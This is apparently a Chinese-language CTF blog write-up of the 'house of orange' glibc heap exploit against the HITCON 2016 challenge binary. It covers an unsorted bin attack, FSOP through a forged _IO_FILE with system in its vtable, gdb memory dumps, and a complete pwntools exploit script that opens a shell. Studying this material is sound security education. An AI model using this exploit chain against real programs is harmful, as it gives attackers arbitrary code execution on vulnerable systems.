---
title: CTF | house of orange
date: 2018-09-28 10:00:02
tags:
---
 `house of range`
 `IO_FILE`
<!-- more -->
来调一下 `house of orange`,快忘了，也整理一下 `IO_FILE` 的东西

嗯..难道我之前 houseoforange 的脚本都没跑成功吗？？奇怪。。
`unsorted bin attack:`
忘记了 ... 我先理一遍再看 exp 吧

### 利用思路
1. 利用 `Unsotred bin attack` 攻击`_IO_List_all`，劫持控制流。

控制`bk`字段，往`bk+0x10`写`unsortedbin`固定的一个地址。
如何想办法调用free?
:init_free (free top chunk ): 
前一个 chunk 必须使用  最后12bit必须是0，对齐
任意地址+0x10写成 unsorted bin 在libc的偏移。


伪造的`top chunk`的大小，需要注意这些检查：


2.怎么覆盖到`top chunk`的`size`的？ 
`unsortbin` 会从链表上卸下来（只要分配的大小不是 `fastchunk` 大小）

larger than MINSIZE(0x10)
smaller than need size + MINSIZE
prev inuse is set
`old_top + oldsize must be aligned a page`.
http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html 
`fd_nextsize` 指向下一个比当前`chunk`大小小的第一个空闲块

`Abort routine：`

下一次通过malloc,就能getshell了
两个比较有用的博客：

具体 `IOfile`构造的脚本：


将`free_hook`重写为`do_system`

程序分析
1. 程序存在堆溢出
2. see 函数可以用来泄露地址

利用思路：
1. 泄露 libc 
2. 泄露 heap
3. unsorted bin attack
4. 伪造 FILE 结构体

在没有 free 函数的情况下生成 unsorted bin:
1.覆盖 top chunk 的 size，使 &top+size 为页对齐，一般来说即 `size = size&0xfff`;
2.申请一个大于`size`且小于`0x20000`的chunk，此时top_chunk 会放入 `unsorted bin`
我们伪造的size 需要满足这些条件：
// 1.`old_size` >= MINSIZE(0x10)
// 2.`old_top`设置了 `prev_inuse` 标志位
// 3.`old_end`正好为页尾，即`(&old_top+old_size)&(0x1000-1) == 0` old_top + oldsize 页对齐
// 4.`old_size < nb+MINSIZE`，old_size不够需求
在实际修改中我们直接留 top chunk 的最后 12 个 bit就好了，毕竟本来肯定对齐嘛!
```python
 assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```


泄露 libc: 利用这个unsorted bin 申请一个`large_chunk`来泄露`libc`基址和`heap`段地址,通过`fd`和`bk`就可以泄露，写8字节内容，bk就泄漏出来了。
泄露 heap :申请 `large_chunk`，当malloc一个large_chunk的时候，会把`chunk`自身的地址写到`chunk`的`fd_nextsize`和`bk_nextsize`的位置。因此只要写入`0x10`的字节就可以`leak`出写在`fd_nextsize`位置的`heap`的地址了

利用 `unsorted bin attack `来任意地址写修改 `_IO_list_all`。`addr = main_arena+0x58 `

控制流：`malloc_printerr->__libc_message->abort->fflush(_IO_flush_all_lockp)->vtable->_IO_OVERFLOW(hijack->system)`
```python
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;
#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) # bypass 
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base)) # bypass 
           )
          && _IO_OVERFLOW (fp, EOF) == EOF) #hijack!
        result = EOF;
      if (do_lock)
        _IO_funlockfile (fp);
      run_fp = NULL;
    }
```
所以我们需要构造 `bypass` 条件
```c
1.fp->_mode <= 0
2.fp->_IO_write_ptr > fp->_IO_write_base
或
1._IO_vtable_offset (fp) == 0
2.fp->_mode > 0
3.fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
```
第三条需要构造_wide_data为一个满足条件的指针，比如将`wide_data`的`IO_wirte_ptr`指向read_end就可以了。*(_wide_data+0x20) > *(_wide_data+0x18)即`read_end > read_ptr`。
```python
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```
一开始通过 `unsorted bin attack` ,修改 `_IO_list_all`为`main_arena+0x58`，,但是我们没法控制所以我们弄了 `chunk`,也就是`fake io file`,`main_arena+0x58 `处的`fp`，通过`fp->chain` 访问` fake io file`,而 `chain` 的偏移刚好是` smallbin[4]`,所以我们设置的大小是`0x60`,`pre_inuse` 要设为1，所以是`0x61`。对于 `fake io file`,我们需要设置一些变量，才能触发`overflow`,我们把`overflow`的函数改为`system`函数

可以一步看一下：
首先build 一个 house,会生成三个 chunk,1. 记录 name 和 price 的 chunk 地址 2. name chunk 3. price chunk
我们首先 build 一个 0x80 的，然后通过堆溢出修改到 topchunk,注意 top chunk 的大小
```python
gef➤  x/16gx 0x556ecb079010-0x10
0x556ecb079000:	0x0000000000000000	0x0000000000000021
0x556ecb079010:	0x0000556ecb0790c0	0x0000556ecb079030
0x556ecb079020:	0x0000000000000000	0x0000000000000091
0x556ecb079030:	0x0000000041414141	0x0000000000000000
0x556ecb079040:	0x0000000000000000	0x0000000000000000
0x556ecb079050:	0x0000000000000000	0x0000000000000000
0x556ecb079060:	0x0000000000000000	0x0000000000000000
0x556ecb079070:	0x0000000000000000	0x0000000000000000
gef➤  
0x556ecb079080:	0x0000000000000000	0x0000000000000000
0x556ecb079090:	0x0000000000000000	0x0000000000000000
0x556ecb0790a0:	0x0000000000000000	0x0000000000000000
0x556ecb0790b0:	0x0000000000000000	0x0000000000000021
0x556ecb0790c0:	0x0000001f00000001	0x0000000000000000
0x556ecb0790d0:	0x0000000000000000	0x0000000000020f31 => top chunk size = 0x20f31
0x556ecb0790e0:	0x0000000000000000	0x0000000000000000
0x556ecb0790f0:	0x0000000000000000	0x0000000000000000
```
覆盖后：
```python
gef➤  x/16gx 0x556ecb079010-0x10
0x556ecb079000:	0x0000000000000000	0x0000000000000021
0x556ecb079010:	0x0000556ecb0790c0	0x0000556ecb079030
0x556ecb079020:	0x0000000000000000	0x0000000000000091
0x556ecb079030:	0x4242424242424242	0x4242424242424242
0x556ecb079040:	0x4242424242424242	0x4242424242424242
0x556ecb079050:	0x4242424242424242	0x4242424242424242
0x556ecb079060:	0x4242424242424242	0x4242424242424242
0x556ecb079070:	0x4242424242424242	0x4242424242424242
gef➤  
0x556ecb079080:	0x4242424242424242	0x4242424242424242
0x556ecb079090:	0x4242424242424242	0x4242424242424242
0x556ecb0790a0:	0x4242424242424242	0x4242424242424242
0x556ecb0790b0:	0x0000000000000000	0x0000000000000021
0x556ecb0790c0:	0x0000002000000002	0x0000000000000000
0x556ecb0790d0:	0x0000000000000000	0x0000000000000f31 => top chunk size = 0xf31
0x556ecb0790e0:	0x0000000000000000	0x0000000000000000
0x556ecb0790f0:	0x0000000000000000	0x0000000000000000
```
然后申请一个更大的 chunk,使原来的top chunk 放入 Unsorted bin:
为什么这个 bin 大小为0xed0 呢？
[+] unsorted_bins[0]: fw=0x556ecb079110, bk=0x556ecb079110
 →   Chunk(addr=0x556ecb079120, size=0xed0, flags=PREV_INUSE)
然后我们申请一个 largechunk，会从 unsorted bin 中割出来

```python
gef➤  x/16gx 0x556ecb079140-0x10
0x556ecb079130:	0x0000000000000000	0x0000000000000411
0x556ecb079140:	0x00007f682d805178	0x00007f682d805188 => fd bk 
0x556ecb079150:	0x0000556ecb079130	0x0000556ecb079130
0x556ecb079160:	0x0000000000000000	0x0000000000000000
0x556ecb079170:	0x0000000000000000	0x0000000000000000
0x556ecb079180:	0x0000000000000000	0x0000000000000000
0x556ecb079190:	0x0000000000000000	0x0000000000000000
0x556ecb0791a0:	0x0000000000000000	0x0000000000000000
```
```
[+] unsorted_bins[0]: fw=0x556ecb079560, bk=0x556ecb079560
 →   Chunk(addr=0x556ecb079570, size=0xa80, flags=PREV_INUSE)
```
仅修改 chunk 的部分，通过 see 就能得到 unsorted bin 的头了
>>> hex(0x00007f682d805178-0x00007f682d440000)
'0x3c5178'
通过计算得到 libc 基址。
我们通过写入0x10,再 see 就可以得到 large chunk 的 fd_nextsize,从而泄露 heap 基址
```python
gef➤  x/16gx 0x556ecb079140-0x10
0x556ecb079130:	0x0000000000000000	0x0000000000000411
0x556ecb079140:	0x7878787878787878	0x7878787878787878
0x556ecb079150:	0x0000556ecb079130	0x0000556ecb079130 => fd_nextsize bk_nextsize
0x556ecb079160:	0x0000000000000000	0x0000000000000000
```
>>> hex(0x0000556ecb079130-0x0000556ecb079000)
'0x130'
计算得到 heap 基址。
接下来我们劫持控制流
```python
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

通过堆溢出覆盖的数据：
```python
gef➤  x/16gx 0x55abb0545550-0x10
0x55abb0545540:	0x4444444444444444	0x4444444444444444
0x55abb0545550:	0x000000210000007b	0x0000000000000000
0x55abb0545560:	0x0068732f6e69622f	0x0000000000000061 => bin/sh    size  相当于 fake chunk 吧 smallbin
0x55abb0545570:	0x000000000000ddaa	0x00007f3955dc2510 => io_list_all-0x10
0x55abb0545580:	0x0000000000000000	0x0000000000000000
0x55abb0545590:	0x0000000000000000	0x0000000000000000
0x55abb05455a0:	0x0000000000000000	0x0000000000000000
0x55abb05455b0:	0x0000000000000000	0x0000000000000000
gef➤  
0x55abb05455c0:	0x0000000000000000	0x0000000000000000
0x55abb05455d0:	0x0000000000000000	0x0000000000000000
0x55abb05455e0:	0x0000000000000000	0x0000000000000000
0x55abb05455f0:	0x0000000000000000	0x0000000000000000
0x55abb0545600:	0x000055abb0545630	0x0000000000000000  
0x55abb0545610:	0x0000000000000000	0x0000000000000000
0x55abb0545620:	0x0000000000000001	0x0000000000000000
0x55abb0545630:	0x0000000000000000	0x000055abb0545658 => vtable_addr 
gef➤  
0x55abb0545640:	0x0000000000000001	0x0000000000000002 
0x55abb0545650:	0x0000000000000003	0x0000000000000000
0x55abb0545660:	0x0000000000000000	0x0000000000000000
0x55abb0545670:	0x00007f3955a42390	0x0000000000000000 => system addr 
0x55abb0545680:	0x0000000000000000	0x0000000000000000
0x55abb0545690:	0x0000000000000000	0x0000000000000000
0x55abb05456a0:	0x0000000000000000	0x0000000000000000
```
看一下我们伪造的文件结构
```python
gef➤  p *(struct _IO_FILE_plus*)0x55abb0545560
$5 = {
  file = {
    _flags = 0x6e69622f, 
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
    _IO_read_end = 0xddaa <error: Cannot access memory at address 0xddaa>, 
    _IO_read_base = 0x7f3955dc2510 "", 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0x0, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x0, 
    _offset = 0x0, 
    _codecvt = 0x0, 
    _wide_data = 0x55abb0545630, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x1, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x55abb0545658
}
```
wide_data:
```python
gef➤  x/16gx 0x55abb0545630
0x55abb0545630:	0x0000000000000000	0x000055abb0545658
0x55abb0545640:	0x0000000000000001	0x0000000000000002
0x55abb0545650:	0x0000000000000003	0x0000000000000000
0x55abb0545660:	0x0000000000000000	0x0000000000000000
0x55abb0545670:	0x00007f3955a42390	0x0000000000000000
```
满足 *(_wide_data+0x20) > *(_wide_data+0x18)
再看看 vtable:
```python
gef➤  p *(struct _IO_jump_t*)0x55abb0545658
$4 = {
  __dummy = 0x0, 
  __dummy2 = 0x0, 
  __finish = 0x0, 
  __overflow = 0x7f3955a42390 <__libc_system>, 
  __underflow = 0x0, 
  __uflow = 0x0, 
  __pbackfail = 0x0, 
  __xsputn = 0x0, 
  __xsgetn = 0x0, 
  __seekoff = 0x0, 
  __seekpos = 0x0, 
  __setbuf = 0x0, 
  __sync = 0x0, 
  __doallocate = 0x0, 
  __read = 0x0, 
  __write = 0x0, 
  __seek = 0x0, 
  __close = 0x0, 
  __stat = 0x0, 
  __showmanyc = 0x0, 
  __imbue = 0x0
}
```

我们通过unsorted bin attack写入了_IO_list_all，并且构造unsorted bin的size为0x61，且将这个bin构造成一个_IO_FILE的结构体，之后在通过一次malloc，系统会将这个bin放入相应的smallbin 0x60，即构造好了_chain，之后由于unsorted bin attack留下的错误，系统调用malloc_printerr去打印错误信息，并最后经过一系列函数使用了_IO_list_all，通过fp->_chain 到了我们在堆上布置好的_IO_FILE的结构体，通过一系列检测后最终调用我们的虚表函数，即system。
不过不知道为什么有时会失败。。

最终 `payload`
```python
#/usr/env/bin python
from pwn import *
 
context.binary = './houseoforange'
#context.log_level = 'debug'
 
io = process('./houseoforange')
elf = ELF('./houseoforange')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
def build(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(1))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name :')
    io.send(Name)
    io.recvuntil('Orange:')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange:')
    io.sendline(str(Choice))
 
def see():
    io.recvuntil('Your choice : ')
    io.sendline(str(2))
 
def upgrade(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(3))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name:')
    io.send(Name)
    io.recvuntil('Orange: ')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange: ')
    io.sendline(str(Choice))
 
#OverWrite TopChunk
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0x1)+p32(0x1f)+2*p64(0)+p64(0xf31),2,2)
 
#trigger TopChunk->unsorted bin 
build(0x1000,'CCCC',3,3)
 
#leak libc_base 
build(0x400,'x',4,4)
see()
io.recvuntil('Name of house : ')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c5178
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))
 
#leak heap_base
upgrade(0x400,'x'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('x'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))
 
# unsortedbin attack
# Fsop
vtable_addr = heap_base + 0x728-0xd0
# Before the unsorted chunk is removed from the unsorted bin, we can overwrite the bk pointer with any address-0x10.
payload = "D"*0x410
payload += p32(6+0x1f)+p32(6)+p64(0)
 
stream = "/bin/sh\x00"+p64(0x61)
# Stream
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream = stream.ljust(0xa0,"\x00")
## fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
stream += p64(heap_base+0x700-0xd0)
stream = stream.ljust(0xc0,"\x00") # mode > 0 
stream += p64(1)
 
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(system_addr) # 
upgrade(0x800,payload,123,3)
#gdb.attach(io)
 
io.recvuntil('Your choice : ')
io.sendline(str(1))
gdb.attach(io)
io.interactive()
```
一些说明：
vtable_addr = heap_base + 0x728-0xd0 ：这个地址我们可以根据 system 被写入的地址偏移计算得到，或者动态调一下也能看到：
```python
gef➤  x/16gx 0x000055abb0545000+0x728-0xd0
0x55abb0545658:	0x0000000000000000	0x0000000000000000
0x55abb0545668:	0x0000000000000000	0x00007f3955a42390
```

一些打印信息有用的命令：
```python
p *_IO_list_all
p _IO_list_all
p *(struct _IO_jump_t*)address 
p *(struct _IO_FILE_plus*)address 
p _IO_2_1_stdin_
p &((struct _IO_FILE*)0)->_chain # 打印偏移
```

还需要巩固加强。。

### houseoforange in libc 2.24
趁热打铁 我们来看一下 glibc 2.24 下的 house of orange
`glibc_2.24`以后，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，`glibc` 会在调用虚函数之前首先检查vtable地址的合法性
关注点从`vtable`转移到`_IO_FILE`结构内部的域中

1. IO_validate_vtable 
2. _IO_vtable_check 
利用技术
- _IO_str_jumps
这个 vtable 中包含了一个叫做 _IO_str_overflow 的函数，该函数中存在相对地址的引用（可伪造）


### 参考链接

http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html   
https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion
house of range:
http://tacxingxing.com/2018/01/10/house-of-orange/#toc_6
https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
https://www.cnblogs.com/shangye/p/6268981.html
